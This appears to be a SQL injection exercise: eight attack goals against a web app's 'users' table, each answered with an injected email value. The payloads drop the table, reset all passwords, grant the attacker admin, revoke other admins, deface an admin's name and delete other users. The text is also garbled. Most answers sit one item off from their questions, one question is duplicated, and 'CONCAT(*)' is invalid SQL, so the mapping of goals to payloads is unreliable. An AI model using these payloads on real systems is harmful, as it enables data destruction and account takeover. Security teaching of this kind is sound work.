#1 Drop the entire users table?

'{$post['email']}' = "''; DROP TABLE users"

#2 Update your first_name to be the email and password of all users who is an admin (assume that there is a field in the users table called is_admin where it's 0 if the user is not an admin, or 1 if the user is an admin).  This way, when you log out and log back in, instead of saying Welcome [your first_name], it would say Welcome ___what ever was stored in first_name field___.

'{$post['email']}' = "''; UPDATE users SET password = '123' WHERE 1=1"

#3 Update your user access so that you now have an admin access.

'{$post['email']}' = "''; UPDATE users SET first_name = CONCAT(email, password) WHERE first_name = myFirstName"

#4 Update all the user access of the admin so that they are no longer admin (this way, you are now the only one having admin access and you can threaten the site users).

'{$post['email']}' = "''; UPDATE users SET is_admin = 1 WHERE first_name = myFirstName"

#5 Update your first_name to now contain all the field names available in the users table (to see if. there are other sensitive information you can hack).


'{$post['email']}' = "''; UPDATE users SET is_admin = 0 WHERE first_name != myFirstName"

#6 Update the first_name of user id = 1 who is an admin to 'You have been hacked!'.  When this user logs in, instead of saying Welcome [first_name].  It would say, "Welcome You have been hacked!".

'{$post['email']}' = "''; UPDATE users SET first_name = CONCAT(*) WHERE is_admin = 1"

#7 Delete all users except yourself

'{$post['email']}' = "''; UPDATE users SET first_name = 'Welcome you have been hacked!' WHERE user_id = 1"

#8 Delete all users except yourself

'{$post['email']}' = "''; DELETE FROM users WHERE first_name != myFirstName"